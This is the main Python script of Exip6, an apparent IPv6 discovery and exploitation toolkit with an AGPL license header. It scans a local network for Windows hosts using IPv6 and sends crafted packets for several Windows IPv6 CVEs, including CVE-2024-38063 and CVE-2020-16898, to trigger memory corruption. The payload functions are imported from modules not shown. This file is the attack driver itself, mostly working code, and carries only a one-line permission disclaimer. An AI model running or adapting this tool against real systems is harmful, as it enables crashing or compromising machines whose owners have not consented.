"""
    Exip6 - A modern IPv6 discovery, and exploitation toolkit that supports various IPv6 CVE exploits from the past decade with Python3 & Scapy.
    Created by Adrian Tarver(Th3Tr1ckst3r) @ https://github.com/Th3Tr1ckst3r/

////////////////////////////////////////////////////////////////////////////////////////

  IMPORTANT: READ BEFORE DOWNLOADING, COPYING, INSTALLING OR USING.

  By downloading, copying, installing, or using the software you agree to this license.
  If you do not agree to this license, do not download, install,
  copy, or use the software.


                    GNU AFFERO GENERAL PUBLIC LICENSE
                       Version 3, 19 November 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU Affero General Public License is a free, copyleft license for
software and other kinds of works, specifically designed to ensure
cooperation with the community in the case of network server software.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
our General Public Licenses are intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  Developers that use our General Public Licenses protect your rights
with two steps: (1) assert copyright on the software, and (2) offer
you this License which gives you legal permission to copy, distribute
and/or modify the software.

  A secondary benefit of defending all users' freedom is that
improvements made in alternate versions of the program, if they
receive widespread use, become available for other developers to
incorporate.  Many developers of free software are heartened and
encouraged by the resulting cooperation.  However, in the case of
software used on network servers, this result may fail to come about.
The GNU General Public License permits making a modified version and
letting the public access it on a server without ever releasing its
source code to the public.

  The GNU Affero General Public License is designed specifically to
ensure that, in such cases, the modified source code becomes available
to the community.  It requires the operator of a network server to
provide the source code of the modified version running there to the
users of that server.  Therefore, public use of a modified version, on
a publicly accessible server, gives the public access to the source
code of the modified version.

  An older license, called the Affero General Public License and
published by Affero, was designed to accomplish similar goals.  This is
a different license, not a version of the Affero GPL, but Affero has
released a new version of the Affero GPL which permits relicensing under
this license.

  The precise terms and conditions for copying, distribution and
modification follow here:

https://raw.githubusercontent.com/Th3Tr1ckst3r/Exip6/main/LICENSE

"""
import time
import sys
import signal
import argparse
from multiprocessing import Process, Manager, Event
from scapy.all import *
from utils.utils import *
from utils.payloads import *
from utils.supported import supported_cves
from utils.banner import banner
from mac_vendor_lookup import MacLookup


# Global variables
manager = None
ipv4_potential_targets = None


def setup_manager():
    """Setup the global manager, and shared dictionary."""
    global manager, ipv4_potential_targets
    manager = Manager()
    ipv4_potential_targets = manager.dict()
    MacLookup().update_vendors()


def system_check():
    """Ensure system is supported, I.E. Linux."""
    if sys.platform == 'linux':
        return True
    else:
        return False


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        prog="sudo python3 exip6.py",
        description=f"""Exip6 - A modern IPv6 discovery, and exploitation toolkit for applying IPv6 CVE exploits from
        the past decade to modern systems, & servers with Python3 & Scapy.""",
        epilog="""
        Disclaimer: Must be run with sudo/root user. Only use on systems/servers you have permission to.
        """
    )
    # Common arguments
    parser.add_argument('-v', '-V', '--verbose', action='store_true', help='Enable verbose output.')
    parser.add_argument('-i', '--interface', type=str, default='auto', help='Specify your network interface. Default is: auto.')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Specify request timeout. Default is: 5.')
    parser.add_argument('-l', '--list', '-L', action='store_true', help="Displays the full list of supported CVE's within Exip6.")

    # Discovery mode arguments
    discovery_mode = parser.add_argument_group('Discovery Mode')
    discovery_mode.add_argument('-D', '--discovery', action='store_true', help='Enable discovery mode.')
    discovery_mode.add_argument('-r', '--resolve', type=str, help='Resolve domain or IPv4 to IPv6.')
    discovery_mode.add_argument('-g', '--gateway', type=str, default='192.168.0.1', help='Network gateway. Default is: 192.168.0.1.')
    discovery_mode.add_argument('-sd', '--sniff-duration', type=int, default=30, help='Sniffing duration in seconds. Default is: 30.')
    discovery_mode.add_argument('-cidr', '--cidr', type=str, default='192.168.0.1/24', help='Network CIDR. Default is: 192.168.0.1/24.')
    discovery_mode.add_argument('-dns', '--nameserver', type=str, default='1.1.1.1', help='DNS server. Default is: 1.1.1.1.')
    discovery_mode.add_argument('-prefix', '--ipv6-prefix', type=str, default='fe80::1/16', help='IPv6 network prefix for RA packets.')
    discovery_mode.add_argument('-nra', '--no-ra-packets', action='store_true', help='Disables the use of RA packets in discovery mode.')

    # Exploit mode arguments
    exploit_mode = parser.add_argument_group('Exploit Mode')
    exploit_mode.add_argument('-E', '--exploit', action='store_true', help='Enable exploit mode.')
    exploit_mode.add_argument('-ip6', '--ipv6', type=str, help='Specify an IPv6 address.')
    exploit_mode.add_argument('-m', '--mac', type=str, help='Specify a MAC address.')
    exploit_mode.add_argument('-num', '--num-packets', type=int, default=25, help='Number of packets to send. Default is 25.')
    exploit_mode.add_argument('-p', '--payload', type=int, default=38063, help='IPv6 Windows CVE payload to exploit. Default is by most recent 38063 for simplicity, or CVE-2024-38063. Only provide the last 5-6 digits.')

    print('\nStarting Exip6...')

    return parser.parse_args()


def validate_interface(args):
    """Validate and set up the network interface."""
    if args.interface == 'auto':
        if args.verbose:
            print('\nDetecting best interface...')
        args.interface = get_interface(gateway=args.gateway, verbose=args.verbose, timeout=args.timeout)
    else:
        args.interface = get_interface(interface=args.interface, gateway=args.gateway, verbose=args.verbose, timeout=args.timeout)

    if not args.interface:
        print("\nError: No live interfaces found.")
        sys.exit(1)

    if args.verbose:
        print(f"\nUsing interface: {args.interface}")


def handle_discovery(args, stop_event):
    """Handle discovery mode operations."""
    global ipv4_potential_targets
    setup_manager()  # Initialize manager and shared dictionary

    print('\nAttempting to locate potentially vulnerable Windows IPv6 machines on local network...')

    arp_scan_map = arp_scan_local(cidr=args.cidr, interface=args.interface, verbose=args.verbose, timeout=args.timeout)

    processes = []
    for key, value in arp_scan_map.items():
        if args.verbose:
            print(f'\nPerforming NMap OS detection scan on {key}...')
        p = Process(target=nmap_worker, args=(key, value[0], value[1], args.verbose, ipv4_potential_targets))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

    if stop_event.is_set():
        print("\nProcess interrupted during discovery.")
        return

    if args.verbose:
        print(f'\nSniffing IPv6 addresses on {args.interface}...')

    ipv6_potential_targets = {}
    ipv6_map = sniff_ipv6_local(interface=args.interface, verbose=args.verbose, sniff_duration=args.sniff_duration, network_prefix=args.ipv6_prefix, disable_ra=args.no_ra_packets)

    for ipv6_addr, lst0 in ipv6_map.items():
        for ipv4_addr, lst1 in ipv4_potential_targets.items():
            if lst0[0] == lst1[0]:
                ipv6_potential_targets[ipv6_addr] = [lst0[0], lst0[1]]
                if 'fe80' in ipv6_addr:
                    print(f'\nPotentially vulnerable Windows device found using IPv6, link local address: {ipv6_addr}, {lst0[0]}, Cross-referenced IPv4 address with matched MAC address/vendor: {ipv4_addr}, {lst1[0]}, {lst1[1]}.')
                elif 'ff00' in ipv6_addr:
                    print(f'\nPotentially vulnerable Windows device found using IPv6, multicast address: {ipv6_addr}, {lst0[0]}, Cross-referenced IPv4 address with matched MAC address/vendor: {ipv4_addr}, {lst1[0]}, {lst1[1]}.')
                else:
                    print(f'\nPotentially vulnerable Windows device found using IPv6, global unicast address: {ipv6_addr}, {lst0[0]}, Cross-referenced IPv4 address with matched MAC address/vendor: {ipv4_addr}, {lst1[0]}, {lst1[1]}.')

    if ipv6_potential_targets:
        print('\nGood luck, & Happy Hunting! ;-)')
    else:
        print('\nNo vulnerable IPv6 Windows machines were found.')


def handle_exploit(args, stop_event):
    """Handle exploit mode operations."""
    if args.payload == 38063:
        if args.ipv6 and args.mac:
            payload = cve_2024_38063(args.ipv6, args.mac, verbose=args.verbose)
            if args.verbose:
                print(f"\nSending payload to IPv6: {args.ipv6} with MAC: {args.mac}")
            for _ in range(args.num_packets):
                if stop_event.is_set():
                    print("\nProcess interrupted during exploit.")
                    return
                sendp(payload, verbose=args.verbose)
            countdown(stop_event)
        elif args.ipv6:
            payload = cve_2024_38063(args.ipv6, verbose=args.verbose)
            if args.verbose:
                print(f"Sending payload to IPv6 Address: {args.ipv6}")
            for _ in range(args.num_packets):
                if stop_event.is_set():
                    print("\nProcess interrupted during exploit.")
                    return
                sendp(payload, verbose=args.verbose)
            countdown(stop_event)


    elif args.payload == 34718:
        if args.ipv6 and args.mac:
            if args.verbose:
                print(f"Sending payload to IPv6 Address: {args.ipv6}")
            payload = cve_2022_34718(ipv6_addr=args.ipv6, mac_addr=args.mac, verbose=args.verbose, stop_event=stop_event)
            if payload:
                print('\nExploit process completed successfully!')
                sys.exit(0)
            else:
                print('\nExploit process did not complete successfully...')
                sys.exit(1)

        elif args.ipv6:
            if args.verbose:
                print(f"Sending payload to IPv6 Address: {args.ipv6}")
            payload = cve_2022_34718(ipv6_addr=args.ipv6, verbose=args.verbose, stop_event=stop_event)
            if payload:
                print('\nExploit process completed successfully!')
                sys.exit(0)
            else:
                print('\nExploit process did not complete successfully...')
                sys.exit(1)

    elif args.payload == 24086:
        if args.ipv6 and args.mac:
            payload = cve_2021_24086(ipv6_addr=args.ipv6, mac_addr=args.mac, verbose=args.verbose, iface=args.interface, stop_event=stop_event)
            if stop_event.is_set():
                print("\nProcess interrupted during exploit.")
                return
            print('\nExploit process completed successfully!')
            sys.exit(0)

        elif args.ipv6:
            payload = cve_2021_24086(ipv6_addr=args.ipv6, mac_addr='FF:FF:FF:FF:FF:FF', verbose=args.verbose, iface=args.interface, stop_event=stop_event)
            if stop_event.is_set():
                print("\nProcess interrupted during exploit.")
                return
            print('\nExploit process completed successfully!')
            sys.exit(0)

    elif args.payload == 16898:
        if args.ipv6 and args.mac:
            payload = cve_2020_16898(ipv6_addr=args.ipv6, mac_addr=args.mac, verbose=args.verbose, stop_event=stop_event)
            if stop_event.is_set():
                print("\nProcess interrupted during exploit.")
                return
            print('\nExploit process completed successfully!')
            sys.exit(0)

        elif args.ipv6:
            payload = cve_2020_16898(ipv6_addr=args.ipv6, verbose=args.verbose, stop_event=stop_event)
            if stop_event.is_set():
                print("\nProcess interrupted during exploit.")
                return
            print('\nExploit process completed successfully!')
            sys.exit(0)
    else:
        print('\nUnsupported Windows IPv6 CVE payload number was provided, or does not exist...')
        return


def countdown(stop_event):
    """Print a countdown for memory corruption trigger."""
    for i in range(60):
        if stop_event.is_set():
            print("\nProcess interrupted during countdown.")
            return
        print(f"\nMemory corruption will be triggered in {60-i} seconds...", end='\r')
        time.sleep(1)
    print('\nExploit process completed successfully!')
    sys.exit(0)


def handle_resolution(args):
    """Resolve IPv4 or domain to IPv6 addresses if discovery mode is enabled."""
    if args.resolve:
        if args.verbose:
            print(f"Resolving {args.resolve}...")

        t1 = is_valid_ipv4(args.resolve)
        t2 = is_valid_domain(args.resolve)

        if t1:
            # Resolve IPv4 to IPv6
            result = resolve_ipv4_to_ipv6(ipv4_addr=args.resolve, nameserver=args.dns, timeout=args.timeout, verbose=args.verbose)
            if args.verbose:
                print(f"\nIPv6 address found for IPv4 address {args.resolve}: {result}")
            for r in result:
                print(f'\nIPv6 address found for: {args.resolve}, IPv6 Address: {r}')
            sys.exit(0)

        elif t2:
            # Resolve domain to IPv6
            result = resolve_domain_to_ipv6(domain=args.resolve, nameserver=args.dns, timeout=args.timeout, verbose=args.verbose)
            if args.verbose:
                print(f"\nIPv6 address found for domain {args.resolve}: {result}")
            for r in result:
                print(f'\nIPv6 address found for: {args.resolve}, IPv6 Address: {r}')
            sys.exit(0)

        else:
            print(f'\nInvalid IP address or domain name: {args.resolve}')
            sys.exit(1)


def main():
    # If you don't like the banner, you can comment it out here.
    try:
        print(banner)
        args = parse_arguments()
        if not system_check():
            print('\nError: Your operating system is currently not supported by Exip6.')
            sys.exit(1)

        setup_manager()
        stop_event = Event()

        def signal_handler(signum, frame):
            print("\nSignal received, terminating processes...")
            stop_event.set()
            sys.exit(0)

        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

        validate_interface(args)

        if args.list:
            print(supported_cves)
            sys.exit(0)

        elif args.discovery:
            handle_discovery(args, stop_event)

        elif args.exploit:
            handle_exploit(args, stop_event)

        elif args.resolve:
            handle_resolution(args)

        else:
            print("\nError: No mode selected. Use -D for discovery mode, or -E for exploit mode.")
            sys.exit(1)

        sys.exit(0)
    except PermissionError:
        print('\nError: You must run exip6.py as ROOT user/use sudo.\n')
        sys.exit(1)
    except KeyboardInterrupt:
        print("\nSignal received, terminating processes...\n")
        sys.exit(0)


if __name__ == "__main__":
    main()
    sys.exit(0)

